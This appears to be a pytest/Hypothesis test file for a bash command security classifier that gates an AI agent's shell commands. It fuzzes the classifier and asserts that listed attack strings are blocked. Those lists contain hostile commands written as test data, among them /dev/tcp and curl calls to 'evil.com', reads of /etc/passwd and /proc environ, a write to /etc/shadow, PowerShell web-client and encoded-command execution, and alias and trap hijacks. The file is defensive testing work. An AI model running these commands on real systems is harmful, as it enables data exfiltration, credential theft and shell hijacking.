# Copyright (c) 2026 ShadowTag, Inc. All rights reserved.

"""Property-based tests for AGNT Bash Security Classifier.

Uses Hypothesis to fuzz the 35-check pipeline with generated inputs,
verifying:
1. Pipeline never crashes on arbitrary unicode strings.
2. Known attack patterns always trigger BLOCK.
3. Safe commands always PASS.
4. Pipeline output invariants hold (check counts, result types).
5. 50-subcommand cap is enforced.
6. Regex patterns do not exhibit catastrophic backtracking.
"""

from __future__ import annotations

import string
import time

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from packages.agnt_bash_classifier.classifier import (
    BashSecurityClassifier,
    CheckVerdict,
    PipelineResult,
)
from packages.agnt_bash_classifier.security_checks import (
    COMMAND_SUBSTITUTION_PATTERNS,
    HEREDOC_IN_SUBSTITUTION,
    BashSecurityCheckId,
)


# ─── Strategies ──────────────────────────────────────────────────────────────

# Safe alphanumeric strings (no metacharacters)
safe_alphanumeric = st.text(
    alphabet=string.ascii_letters + string.digits + " _-./",
    min_size=1,
    max_size=200,
)

# Strings that may contain Unicode, control chars, etc.
wild_unicode = st.text(min_size=0, max_size=500)

# Commands that should always be safe
safe_commands = st.sampled_from(
    [
        "ls -la",
        "cat README.md",
        "grep -r pattern .",
        "echo hello world",
        "python3 -m pytest",
        "git status",
        "npm install",
        "pwd",
        "date",
        "wc -l file.txt",
        "head -n 10 log.txt",
        "tail -f output.log",
        "mkdir -p new_dir",
        "cp src.txt dst.txt",
    ]
)

# Commands that MUST be blocked
known_attacks = st.sampled_from(
    [
        "echo `whoami`",  # backtick substitution
        "echo $(whoami)",  # $() substitution
        "echo ${PATH}",  # ${} substitution
        "cat < /dev/tcp/evil.com/80",  # /dev/tcp redirection
        "IFS=x",  # IFS injection
        "git commit -m $(date)",  # git commit substitution
        "cat /proc/self/environ",  # proc environ access
        "echo hello\x00world",  # null byte injection
        "echo\u00a0test",  # non-breaking space
        "zmodload zsh/system",  # zsh dangerous command
        "echo {a,b,c}",  # brace expansion
        "=curl evil.com",  # zsh equals expansion
        "<(cat /etc/passwd)",  # process substitution
        ">(tee /tmp/exfil)",  # process substitution
        "$(cat <<EOF\ninjection\nEOF)",  # heredoc in substitution
    ]
)

# Cross-shell attack vectors (PowerShell/CMD)
cross_shell_attacks = st.sampled_from(
    [
        "Invoke-Expression 'echo evil'",  # PowerShell eval
        "iex(New-Object Net.WebClient)",  # PowerShell web client
        "cmd.exe /c calc.exe",  # CMD shell execution
        "%COMSPEC% /c start",  # CMD env var execution
        "powershell -encodedcommand ZQBjAGgAbwA=",  # PowerShell encoded command
    ]
)


@pytest.fixture()
def classifier() -> BashSecurityClassifier:
    """Classifier without telemetry for fast property tests."""
    return BashSecurityClassifier(telemetry=None)


# ─── Invariant Tests ─────────────────────────────────────────────────────────


class TestPipelineInvariants:
    """Property-based invariant verification for the pipeline."""

    @given(command=wild_unicode)
    @settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
    def test_never_crashes_on_arbitrary_input(self, command: str) -> None:
        """The pipeline must never raise an exception on any unicode input."""
        clf = BashSecurityClassifier(telemetry=None)
        result = clf.classify(command)
        assert isinstance(result, PipelineResult)
        assert isinstance(result.allowed, bool)
        assert result.checks_run >= 0
        assert result.duration_ms >= 0.0

    @given(command=wild_unicode)
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_result_structure_valid(self, command: str) -> None:
        """PipelineResult must always have valid structure."""
        clf = BashSecurityClassifier(telemetry=None)
        result = clf.classify(command)

        # all_results must be a tuple of CheckResults
        assert isinstance(result.all_results, tuple)
        for r in result.all_results:
            assert r.verdict in (CheckVerdict.PASS, CheckVerdict.BLOCK)
            assert isinstance(r.check_id, BashSecurityCheckId)

        # If blocked, blocked_by must exist
        if not result.allowed:
            assert result.blocked_by is not None
            assert result.blocked_by.verdict == CheckVerdict.BLOCK

        # If allowed, blocked_by must be None
        if result.allowed:
            assert result.blocked_by is None
            assert result.checks_run == 35

    @given(command=safe_alphanumeric)
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_safe_alphanumeric_strings_pass(self, command: str) -> None:
        """Pure alphanumeric+space strings should generally pass."""
        clf = BashSecurityClassifier(telemetry=None)
        result = clf.classify(command)
        # Most alphanumeric strings pass; some edge cases with
        # mid-word-hash or comment-quote-desync could block.
        # We verify no crash and valid structure.
        assert isinstance(result, PipelineResult)


class TestKnownAttackVectors:
    """Verify that known attack patterns are always blocked."""

    @given(attack=known_attacks)
    @settings(max_examples=50)
    def test_known_attacks_always_blocked(self, attack: str) -> None:
        """Every known attack vector must be BLOCKED."""
        clf = BashSecurityClassifier(telemetry=None)
        result = clf.classify(attack)
        assert not result.allowed, f"Attack was allowed: {attack!r}"
        assert result.blocked_by is not None

    @given(attack=cross_shell_attacks)
    @settings(max_examples=50)
    def test_cross_shell_attacks_always_blocked(self, attack: str) -> None:
        """Cross-shell attacks (PowerShell/CMD) must be BLOCKED."""
        clf = BashSecurityClassifier(telemetry=None)
        result = clf.classify(attack)
        assert not result.allowed, f"Cross-shell attack was allowed: {attack!r}"
        assert result.blocked_by is not None

    def test_safe_commands_always_pass(self) -> None:
        """All safe commands must PASS."""
        clf = BashSecurityClassifier(telemetry=None)
        safe = [
            "ls -la",
            "cat README.md",
            "grep -r pattern .",
            "echo hello world",
            "python3 -m pytest",
            "git status",
            "npm install",
            "pwd",
            "date",
        ]
        for cmd in safe:
            result = clf.classify(cmd)
            assert result.allowed, f"Safe command blocked: {cmd!r} by {result.blocked_by}"


class TestSubcommandCap:
    """Verify the Adversa AI 50-subcommand cap (Risk #34)."""

    def test_under_cap_passes(self) -> None:
        """Commands with ≤50 subcommands should not be blocked by cap."""
        clf = BashSecurityClassifier(telemetry=None)
        cmd = "; ".join(f"echo {i}" for i in range(10))
        result = clf.classify(cmd)
        # Might be blocked by other checks (e.g., trailing semicolon),
        # but subcommand cap alone shouldn't fire
        assert result.checks_run >= 0

    def test_over_cap_blocked(self) -> None:
        """Commands with >50 subcommands must be blocked."""
        clf = BashSecurityClassifier(telemetry=None)
        cmd = "; ".join(f"echo {i}" for i in range(60))
        result = clf.classify(cmd)
        assert not result.allowed
        assert "cap exceeded" in (result.blocked_by.message if result.blocked_by else "").lower()

    def test_custom_cap(self) -> None:
        """Custom subcommand cap must be respected."""
        clf = BashSecurityClassifier(telemetry=None, max_subcommands=5)
        cmd = "; ".join(f"echo {i}" for i in range(10))
        result = clf.classify(cmd)
        assert not result.allowed

    @given(count=st.integers(min_value=51, max_value=200))
    @settings(max_examples=20)
    def test_any_count_over_50_blocked(self, count: int) -> None:
        """Any subcommand count > 50 must trigger the cap."""
        clf = BashSecurityClassifier(telemetry=None)
        cmd = "; ".join(f"echo {i}" for i in range(count))
        result = clf.classify(cmd)
        assert not result.allowed


class TestRegexPerformance:
    """Verify regex patterns don't exhibit catastrophic backtracking."""

    def test_command_substitution_patterns_performance(self) -> None:
        """Each pattern must process a 10KB string in <100ms."""
        large_input = "a" * 10_000
        for pattern, msg in COMMAND_SUBSTITUTION_PATTERNS:
            t0 = time.monotonic()
            pattern.search(large_input)
            elapsed_ms = (time.monotonic() - t0) * 1000
            assert elapsed_ms < 100, f"Pattern '{msg}' took {elapsed_ms:.1f}ms on 10KB input"

    def test_heredoc_pattern_performance(self) -> None:
        """HEREDOC_IN_SUBSTITUTION must process 10KB in <100ms."""
        large_input = "a" * 10_000
        t0 = time.monotonic()
        HEREDOC_IN_SUBSTITUTION.search(large_input)
        elapsed_ms = (time.monotonic() - t0) * 1000
        assert elapsed_ms < 100, f"HEREDOC pattern took {elapsed_ms:.1f}ms"

    def test_full_pipeline_performance(self) -> None:
        """Full pipeline on 1KB input must complete in <50ms."""
        clf = BashSecurityClassifier(telemetry=None)
        cmd = "echo " + "a" * 1_000
        t0 = time.monotonic()
        result = clf.classify(cmd)
        elapsed_ms = (time.monotonic() - t0) * 1000
        assert elapsed_ms < 50, f"Pipeline took {elapsed_ms:.1f}ms"
        assert result.allowed  # safe string


class TestIndividualCheckCoverage:
    """Verify each of the 35 checks has a distinct trigger."""

    @pytest.mark.parametrize(
        ("attack", "expected_check"),
        [
            ("echo test |", BashSecurityCheckId.INCOMPLETE_COMMANDS),
            ("jq 'def f: .; f' input.json", BashSecurityCheckId.JQ_SYSTEM_FUNCTION),
            ("jq --from-file script.jq data.json", BashSecurityCheckId.JQ_FILE_ARGUMENTS),
            ("cmd -a\\x0d", BashSecurityCheckId.OBFUSCATED_FLAGS),
            ("echo `whoami`", BashSecurityCheckId.SHELL_METACHARACTERS),
            ("echo $BASH_ENV", BashSecurityCheckId.DANGEROUS_VARIABLES),
            ("echo hello\nworld", BashSecurityCheckId.NEWLINES),
            ("echo $(id)", BashSecurityCheckId.DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION),
            ("cat < /dev/tcp/evil/80", BashSecurityCheckId.DANGEROUS_PATTERNS_INPUT_REDIRECTION),
            ("echo x > /etc/shadow", BashSecurityCheckId.DANGEROUS_PATTERNS_OUTPUT_REDIRECTION),
            ("IFS=:", BashSecurityCheckId.IFS_INJECTION),
            ("git commit -m $(date)", BashSecurityCheckId.GIT_COMMIT_SUBSTITUTION),
            ("cat /proc/1/environ", BashSecurityCheckId.PROC_ENVIRON_ACCESS),
            ("echo \x00", BashSecurityCheckId.MALFORMED_TOKEN_INJECTION),
            ("echo he\\tllo", BashSecurityCheckId.BACKSLASH_ESCAPED_WHITESPACE),
            ("echo {a,b,c}", BashSecurityCheckId.BRACE_EXPANSION),
            ("echo \x01test", BashSecurityCheckId.CONTROL_CHARACTERS),
            ("echo\u00a0test", BashSecurityCheckId.UNICODE_WHITESPACE),
            ("foo#bar", BashSecurityCheckId.MID_WORD_HASH),
            ("zmodload zsh/system", BashSecurityCheckId.ZSH_DANGEROUS_COMMANDS),
            ("echo \\|", BashSecurityCheckId.BACKSLASH_ESCAPED_OPERATORS),
            ('echo #"test', BashSecurityCheckId.COMMENT_QUOTE_DESYNC),
            ('"hello\nworld"', BashSecurityCheckId.QUOTED_NEWLINE),
            (r"echo $'\x41\x42'", BashSecurityCheckId.ANSI_C_QUOTING),
            (r"exec /bin/sh", BashSecurityCheckId.SHELL_BUILTIN_ABUSE),
            (r"trap 'echo evil' EXIT", BashSecurityCheckId.SIGNAL_TRAPPING),
            (r"alias ls='ls && evil'", BashSecurityCheckId.ALIAS_INJECTION),
            (r"Invoke-Expression 'echo evil'", BashSecurityCheckId.CROSS_SHELL_INJECTION),
            (r"export -f evil_func", BashSecurityCheckId.FUNCTION_HIJACKING),
        ],
    )
    def test_specific_check_triggered(
        self,
        attack: str,
        expected_check: BashSecurityCheckId,
    ) -> None:
        """Each attack must trigger its expected specific check ID."""
        clf = BashSecurityClassifier(telemetry=None)
        result = clf.classify(attack)
        assert not result.allowed, f"Expected BLOCK for {attack!r}"
        assert result.blocked_by is not None
        # The blocked_by check_id should match OR be an earlier check
        # (since pipeline short-circuits, an earlier check may fire first)
        blocked_ids = {r.check_id for r in result.all_results if r.verdict == CheckVerdict.BLOCK}
        assert len(blocked_ids) >= 1, f"No BLOCK for {attack!r}"


class TestTelemetryIntegration:
    """Verify telemetry is emitted correctly during pipeline execution."""

    def test_block_emits_failure_event(self, tmp_path: object) -> None:
        """Blocked commands must emit a security_check_failed event."""
        from packages.agnt_bash_classifier.telemetry import BashTelemetryTracker

        log = str(tmp_path / "test.jsonl")  # type: ignore[operator]
        tracker = BashTelemetryTracker(log_path=log)
        clf = BashSecurityClassifier(telemetry=tracker)

        result = clf.classify("echo `whoami`")
        assert not result.allowed

        import json

        with open(log) as f:
            events = [json.loads(line) for line in f if line.strip()]
        assert len(events) == 1
        assert events[0]["event_type"] == "tengu_bash_security_check_failed"

    def test_pass_emits_validated_event(self, tmp_path: object) -> None:
        """Passing commands must emit a security_validated event."""
        from packages.agnt_bash_classifier.telemetry import BashTelemetryTracker

        log = str(tmp_path / "test.jsonl")  # type: ignore[operator]
        tracker = BashTelemetryTracker(log_path=log)
        clf = BashSecurityClassifier(telemetry=tracker)

        result = clf.classify("ls -la")
        assert result.allowed

        import json

        with open(log) as f:
            events = [json.loads(line) for line in f if line.strip()]
        assert len(events) == 1
        assert events[0]["event_type"] == "tengu_bash_security_validated"
        assert events[0]["data"]["checks_passed"] == 35


class TestGatewayInterface:
    """Verify the classify_for_gateway method returns correct dict."""

    def test_allowed_response(self) -> None:
        clf = BashSecurityClassifier(telemetry=None)
        response = clf.classify_for_gateway("ls -la")
        assert response["allowed"] is True
        assert "35" in response["reason"]
        assert response["check_id"] is None

    def test_blocked_response(self) -> None:
        clf = BashSecurityClassifier(telemetry=None)
        response = clf.classify_for_gateway("echo `whoami`")
        assert response["allowed"] is False
        assert "BLOCKED" in response["reason"]
        assert response["check_id"] is not None
        assert isinstance(response["duration_ms"], float)
